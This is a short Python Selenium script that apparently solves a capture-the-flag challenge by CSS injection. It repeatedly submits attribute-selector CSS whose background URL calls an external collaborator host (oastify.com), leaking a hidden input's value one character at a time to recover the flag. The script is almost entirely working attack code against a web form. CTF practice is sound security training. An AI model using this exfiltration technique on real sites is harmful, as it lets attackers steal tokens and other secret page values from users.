#!/usr/bin/python3
# Remember to start geckodriver first /root/boxes/test/browser_automation/geckodriver &
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import sys
import string

def main():
    valid_chars = string.ascii_uppercase + string.digits + 'f'
    # Set the path to the location of geckodriver
    gecko_path = '/root/boxes/test/browser_automation/geckodriver'

    # Create FirefoxOptions and set the executable path
    firefox_options = Options()
    firefox_options.binary_location = gecko_path

    # Create a Firefox WebDriver instance
    driver = webdriver.Firefox(options=firefox_options)


    found = "grey{"
    while 1:
        for char in valid_chars:
            driver.get('http://challs.nusgreyhats.org:33339/')

            input_element = driver.find_element(By.ID, "css-submit")
            input_element.send_keys(f'input[value^="{found}{char}"] {{ color: red; background: url(http://g5m8alfc47b0ghqi46wryxbl5cb3zxzlo.oastify.com/{char}); }}')


            submit_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//button[@type='submit']"))
            )
            submit_button.click()

            # Wait for the new page or elements to load
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//input[@type='submit']"))
            )

            # Refind the button in the new page context
            submit_button2 = driver.find_element(By.XPATH, "//input[@type='submit']")
            submit_button2.click()
            print(f"Char: {char}")
        found_char = input("Enter found char: ")
        if found_char == "":
            break
        found += found_char
    print(f"Flag: {found}")


    # Close the browser


if __name__ == '__main__':
    main()